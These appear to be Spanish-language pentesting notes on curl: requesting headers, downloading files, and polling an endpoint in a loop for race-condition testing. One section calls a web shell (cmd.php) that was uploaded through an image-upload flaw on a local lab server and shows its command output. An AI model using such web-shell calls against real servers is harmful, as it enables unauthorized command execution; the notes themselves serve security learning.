
---
# Comandos 

## Petición - Encabezados

Petición **GET** 

```bash
curl https://hackycorp.com/ --dump-header - -o /dev/null -s
```

Petición **HEAD**

```bash
curl https://hackycorp.com/ -I
```

---
## Descargar

Renombrando el archivo 

```bash
curl https://example.com/file.txt -o archivo.txt
```

Nombre original

```bash
curl -O https://example.com/file.txt 
```

Indicar ruta y nombre

```bash
curl https://example.com/file.txt -o /home/usuario/Descargas/ruta/archivo.txt
```

---
## Bypass de descargar

Acción: desde el endpoint podemos visualizar la inyección de comandos en la [[Subida de imágenes]]

```bash
curl -s -X GET "http://localhost:9001/upload56/pwned/cmd.php" -G --data-urlencode "cmd=ls -l"
```

Resultado:

```bash
total 4
-rw-r--r-- 1 www-data www-data 33 Jun  9 14:17 cmd.php
```

---
## Consulta automatizada a un endpoint dinámico

Acción: 

```bash
while true; do curl -s X GET 'http://localhost:5000/?action=run' | grep "Check this out" | html2text | xargs; done
```

Resultado:

```bash
Check this out: Hola
Check this out: Hola
Check this out: Hola
Check this out: Hola
Check this out: Hola
Check this out: Hola
Check this out: Hola
Check this out: Hola
...
```

Explicación: Este tipo de técnica puede ser útil en pruebas de seguridad donde observamos cambios dinámicos en un recurso, recolectamos tokens, ejecutamos [Race Condition](../../OWASP%20TOP%2010/Race%20Condition), o monitorizamos respuestas del servidor en tiempo real.

Realizamos peticiones continuas a un endpoint (`/?action=run`) esperando recibir una respuesta que contenga una cadena de texto específica. Usamos `grep` para filtrar esa cadena (`Check this out`) y `html2text` junto con `xargs` para limpiar el resultado y presentarlo en texto plano.

- `-s` suprime la barra de progreso.
    
- `grep` filtra solo las líneas que contienen `"Check this out"`.
    
- `html2text` convierte HTML a texto plano (requiere tenerlo instalado).
    
- `xargs` elimina saltos de línea adicionales o espacios al final.

---
